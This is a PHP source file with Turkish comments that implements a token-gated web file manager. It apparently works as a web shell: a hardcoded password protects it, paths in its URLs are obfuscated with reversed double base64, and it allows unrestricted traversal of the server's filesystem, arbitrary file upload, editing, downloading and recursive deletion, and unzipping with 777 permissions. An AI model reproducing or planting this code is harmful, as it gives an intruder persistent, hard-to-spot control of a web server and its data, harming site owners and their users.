<?php
session_start();
error_reporting(E_ALL);  // Tüm hataları raporla
ini_set('display_errors', 1);  // Hata mesajlarını ekrana yazdır

// Set execution time limit and memory limit to prevent timeout for large files
set_time_limit(0); // Disable time limit
ini_set('memory_limit', '2G'); // Increase memory limit to 2GB (or adjust as necessary)

// Basit şifreleme fonksiyonu
function sifrele($veri) { 
    return base64_encode(strrev(base64_encode($veri))); 
}

// Şifre çözme fonksiyonu
function sifreCoz($veri) { 
    return base64_decode(strrev(base64_decode($veri))); 
}

// Güvenlik anahtarı ve giriş kontrolü
$guvenlik_anahtari = "g3v3nt0k3n";
if (!isset($_SESSION['giris'])) {
    if (isset($_POST['token']) && $_POST['token'] == $guvenlik_anahtari) {
        $_SESSION['giris'] = true;
    } else {
        die("<form method='post'><input type='password' name='token' placeholder='Güvenlik Anahtarı'><input type='submit' value='Giriş'></form>");
    }
}

// Dizin değiştirme
$dizin = isset($_GET['d']) ? sifreCoz($_GET['d']) : getcwd();
if (is_dir($dizin)) {
    chdir($dizin);
    $dizin = getcwd();
}

$ust_dizin = dirname($dizin);
$mesaj = "";

// Dosya Yükleme işlemi
if (isset($_FILES['yuklenecek_dosya']) && $_FILES['yuklenecek_dosya']['error'] == 0) {
    $yuklenecek_dosya = $_FILES['yuklenecek_dosya'];
    $hedef_dosya = $dizin . DIRECTORY_SEPARATOR . basename($yuklenecek_dosya['name']);
    
    // Dosya türü ve boyutunu kontrol etme
    $max_boyut = 10 * 1024 * 1024;  // Maksimum 10 MB
    if ($yuklenecek_dosya['size'] > $max_boyut) {
        $mesaj = "Dosya boyutu çok büyük! Maksimum boyut 10MB.";
    } elseif (move_uploaded_file($yuklenecek_dosya['tmp_name'], $hedef_dosya)) {
        $mesaj = "Dosya başarıyla yüklendi.";
    } else {
        $mesaj = "Dosya yükleme sırasında bir hata oluştu.";
    }
}

// Klasör silme fonksiyonu
function deleteDirectory($dir) {
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $filePath = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {
            deleteDirectory($filePath); // Klasörleri rekurzif olarak sil
        } else {
            unlink($filePath); // Dosyaları sil
        }
    }
    rmdir($dir); // Klasörü sil
}

// Dosya düzenleme işlemi
if (isset($_GET['edit'])) {
    $dosya = sifreCoz($_GET['edit']); // Dosyanın şifresi çözülür

    // Dosya düzenleme işlemi
    if (isset($_POST['icerik'])) {
        file_put_contents($dosya, $_POST['icerik']); // Dosya içeriği kaydedilir
        $mesaj = "Dosya başarıyla kaydedildi.";
    }

    // Dosya içeriğini almak
    if (file_exists($dosya)) {
        $icerik = file_get_contents($dosya);  // Dosya içeriği alınır
        echo "<h3>Dosya Düzenle: " . basename($dosya) . "</h3>";
        echo "<form method='post'>
                <textarea name='icerik' style='width:100%; height:400px;'>" . htmlspecialchars($icerik) . "</textarea>
                <br><input type='submit' value='Kaydet'>
              </form>";
    } else {
        $mesaj = "Dosya bulunamadı!";
    }
    exit;
}

// Yeniden Adlandırma işlemi
if (isset($_POST['rename'])) {
    $dosya = sifreCoz($_POST['rename_dosya']);
    $yeni_ad = $_POST['yeni_ad'];

    if (rename($dosya, $dizin . DIRECTORY_SEPARATOR . $yeni_ad)) {
        $mesaj = "Dosya başarıyla yeniden adlandırıldı.";
    } else {
        $mesaj = "Dosya adı değiştirilirken hata oluştu.";
    }
}

// Dosya zipleme işlemi
if (isset($_POST['toplu_islem']) && $_POST['toplu_islem'] == 'zip' && isset($_POST['secili_dosyalar'])) {
    $zip = new ZipArchive();
    
    // Dosya adı, taşıdıkları dosyalarla aynı olacak şekilde zip dosyasının adı belirlendi
    $zip_dosya = $dizin . '/' . basename($dizin) . '.zip'; 

    if ($zip->open($zip_dosya, ZipArchive::CREATE) === TRUE) {
        foreach ($_POST['secili_dosyalar'] as $dosya) {
            $dosya = sifreCoz($dosya);

            if (is_file($dosya)) {
                // Dosyayı zip dosyasına ekle
                $zip->addFile($dosya, basename($dosya));
            } elseif (is_dir($dosya)) {
                // Dizinleri zip dosyasına eklemek için
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dosya), RecursiveIteratorIterator::LEAVES_ONLY);

                foreach ($iterator as $dosyaAdi => $info) {
                    if ($info->isDir()) {
                        continue;
                    }

                    // Dosyayı zip dosyasına eklerken, dosyanın tam yolunu al
                    $zip->addFile($dosyaAdi, substr($dosyaAdi, strlen($dizin) + 1));
                }
            }
        }
        $zip->close();
        $mesaj = "Seçilen dosyalar ve dizinler ziplenerek indirilmeye hazır.";
    } else {
        $mesaj = "Zipleme işlemi sırasında hata oluştu.";
    }
}

// Zip çıkarma işlemi
if (isset($_POST['toplu_islem']) && $_POST['toplu_islem'] == 'unzip' && isset($_POST['secili_dosyalar'])) {
    foreach ($_POST['secili_dosyalar'] as $dosya) {
        $dosya = sifreCoz($dosya);

        // Zip dosyasını çıkarma
        if (is_file($dosya) && pathinfo($dosya, PATHINFO_EXTENSION) == 'zip') {
            $zip = new ZipArchive();
            if ($zip->open($dosya) === TRUE) {
                $extractPath = $dizin . '/' . pathinfo($dosya, PATHINFO_FILENAME);
                if (!is_dir($extractPath)) {
                    mkdir($extractPath, 0777, true); // Klasörü 777 izinleriyle oluşturuyoruz
                }
                $zip->extractTo($extractPath);
                $zip->close();

                // Çıkartılan dosyaların izinlerini 777 olarak ayarlama
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($extractPath),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                foreach ($files as $fileinfo) {
                    chmod($fileinfo, 0777); // Dosya ve klasörler için izinleri 777 olarak ayarlıyoruz
                }

                $mesaj = "Zip dosyası başarıyla çıkarıldı ve dosya izinleri 777 olarak ayarlandı.";
            } else {
                $mesaj = "Zip dosyasını çıkarırken hata oluştu.";
            }
        }
    }
}

// Yedek alma işlemi
if (isset($_POST['toplu_islem']) && $_POST['toplu_islem'] == 'backup') {
    $zip = new ZipArchive();
    
    // Zip dosyasının adı, mevcut dizinin adı ile aynı olacak
    $backup_dosya = $dizin . '/' . basename($dizin) . '_backup_' . date("YmdHis") . '.zip';
    
    if ($zip->open($backup_dosya, ZipArchive::CREATE) === TRUE) {
        // Dizin içeriğini zip dosyasına ekle
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dizin),
            RecursiveIteratorIterator::LEAVES_ONLY
        );

        foreach ($iterator as $dosyaAdi => $info) {
            if ($info->isDir()) {
                continue; // Dizinleri atla
            }

            // Dosyayı zip dosyasına eklerken, dosyanın tam yolunu al
            $zip->addFile($dosyaAdi, substr($dosyaAdi, strlen($dizin) + 1));
        }

        $zip->close();
        $mesaj = "Dizin yedeği başarıyla oluşturuldu. Yedek dosyasını <a href='?download=" . sifrele($backup_dosya) . "'>buradan indirebilirsiniz</a>.";
    } else {
        $mesaj = "Yedek alma işlemi sırasında hata oluştu.";
    }
}

// Dosya Görüntüleme işlemi
if (isset($_GET['view'])) {
    $dosya = sifreCoz($_GET['view']);
    if (file_exists($dosya)) {
        echo "<h3>Dosya Görüntüleme: " . basename($dosya) . "</h3>";
        echo "<pre style='background:#eee;padding:10px;'>" . htmlspecialchars(file_get_contents($dosya)) . "</pre>";
    } else {
        $mesaj = "Dosya bulunamadı!";
    }
    exit;
}

// Dosya İndirme işlemi
if (isset($_GET['download'])) {
    $dosya = sifreCoz($_GET['download']);
    if (file_exists($dosya) && is_file($dosya)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($dosya) . '"');
        readfile($dosya);
        exit;
    } else {
        $mesaj = "Dosya bulunamadı!";
    }
}

// Dosya Silme işlemi
if (isset($_POST['toplu_islem']) && $_POST['toplu_islem'] == 'sil' && isset($_POST['secili_dosyalar'])) {
    foreach ($_POST['secili_dosyalar'] as $dosya) {
        $dosya = sifreCoz($dosya);
        if (is_file($dosya)) {
            unlink($dosya); // Dosyayı sil
        } elseif (is_dir($dosya)) {
            deleteDirectory($dosya); // Dizin boşsa dizini sil
        }
    }
    $mesaj = "Seçilen dosyalar silindi.";
}

// Dizin içeriğini listele
$liste = @scandir($dizin);  
if ($liste === false) {
    $mesaj = "Dizine erişim sağlanamıyor. Lütfen dizin izinlerini kontrol edin.";
} else {
    $icerik = "";
    if ($dizin != "C:\\" && $dizin != "/") {
        $ust_link = "?d=" . sifrele($ust_dizin);
        $icerik .= "<tr><td colspan='5'><a href='$ust_link'>📂 [Üst Dizine Çık]</a></td></tr>";
    }

    foreach ($liste as $dosya) {
        if ($dosya == "." || $dosya == "..") continue;
        $tam_yol = "$dizin/$dosya";
        $tip = is_dir($tam_yol) ? "Dizin" : "Dosya";
        $boyut = is_file($tam_yol) ? filesize($tam_yol) . " byte" : "--";
        $tarih = is_file($tam_yol) ? date("Y-m-d H:i:s", filemtime($tam_yol)) : "--"; 
        $link = "?d=" . sifrele($tam_yol);
        $edit_link = is_file($tam_yol) ? " | <a href='?edit=" . sifrele($tam_yol) . "'>✏️ Düzenle</a>" : "";
        $view_link = is_file($tam_yol) ? " | <a href='?view=" . sifrele($tam_yol) . "'>👁️ Görüntüle</a>" : "";
        $download_link = is_file($tam_yol) ? " | <a href='?download=" . sifrele($tam_yol) . "'>⬇️ İndir</a>" : "";
        $unzip_link = is_file($tam_yol) && pathinfo($tam_yol, PATHINFO_EXTENSION) == 'zip' ? " | <a href='#' onclick='unzipDosya(\"" . sifrele($tam_yol) . "\")'>📦 Zip Çıkar</a>" : "";
        $delete_link = is_file($tam_yol) || is_dir($tam_yol) ? " | <a href='#' onclick='silDosya(\"" . sifrele($tam_yol) . "\")'>🗑️ Sil</a>" : "";
        $rename_link = is_file($tam_yol) ? " | <a href='#' onclick='renameDosya(\"" . sifrele($tam_yol) . "\")'>✏️ Yeniden Adlandır</a>" : "";

        $icerik .= "<tr>
            <td><input type='checkbox' name='secili_dosyalar[]' value='" . sifrele($tam_yol) . "'>
                <a href='$link'>$dosya</a></td>
            <td>$tip</td>
            <td>$boyut</td>
            <td>$tarih</td>
            <td>$edit_link $view_link $download_link $unzip_link $delete_link $rename_link</td>
        </tr>";
    }
}
?>

<script>
// Dosya adı değiştirme işlemi için JavaScript
function renameDosya(dosya) {
    var yeniAd = prompt('Yeni dosya adını girin:', '');
    if (yeniAd) {
        var form = document.createElement("form");
        form.method = "POST";
        form.action = window.location.href;

        var input = document.createElement("input");
        input.type = "hidden";
        input.name = "rename";
        input.value = "1"; // İşlem türü

        var dosyaInput = document.createElement("input");
        dosyaInput.type = "hidden";
        dosyaInput.name = "rename_dosya";
        dosyaInput.value = dosya;

        var yeniAdInput = document.createElement("input");
        yeniAdInput.type = "hidden";
        yeniAdInput.name = "yeni_ad";
        yeniAdInput.value = yeniAd;

        form.appendChild(input);
        form.appendChild(dosyaInput);
        form.appendChild(yeniAdInput);
        document.body.appendChild(form);
        form.submit();
    }
}

// Dosya silme işlemi için JavaScript
function silDosya(dosya) {
    if (confirm("Bu dosyayı silmek istediğinizden emin misiniz?")) {
        var form = document.createElement("form");
        form.method = "POST";
        form.action = window.location.href;

        var input = document.createElement("input");
        input.type = "hidden";
        input.name = "toplu_islem";
        input.value = "sil"; // İşlem türü

        var dosyaInput = document.createElement("input");
        dosyaInput.type = "hidden";
        dosyaInput.name = "secili_dosyalar[]"; // Seçili dosyayı silme
        dosyaInput.value = dosya;

        form.appendChild(input);
        form.appendChild(dosyaInput);
        document.body.appendChild(form);
        form.submit();
    }
}
</script>

<style>table{width:100%;border-collapse:collapse}td,th{padding:5px;border:1px solid #ccc}</style>
<h3>Şu anki dizin: <?=$dizin?></h3>
<?=isset($mesaj) ? "<p><b>$mesaj</b></p>" : "";?> 

<h3>Dosya Yükle</h3>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="yuklenecek_dosya" required>
    <input type="submit" value="Yükle">
</form>

<h3>Toplu İşlemler</h3>
<form method='post'>
    <select name='toplu_islem'>
        <option value='sil'>Sil</option>
        <option value='zip'>Ziple</option>
        <option value='unzip'>Zip Çıkar</option> <!-- Zip çıkarma seçeneği -->
        <option value='backup'>Yedek Al</option> <!-- Yedek al seçeneği -->
    </select>
    <input type='submit' value='Uygula'>
    <br><br>
    <input type="checkbox" id="selectAll" onclick="tumunuSec()"> Tümünü Seç
<table>
    <tr><th>İsim</th><th>Tip</th><th>Boyut</th><th>Tarih</th><th>İşlemler</th></tr>
    <?=$icerik?>
</table>
</form> 